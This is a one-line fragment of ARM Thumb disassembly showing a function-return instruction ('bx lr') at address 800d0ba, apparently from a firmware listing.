 800d0ba:	4770      	bx	lr
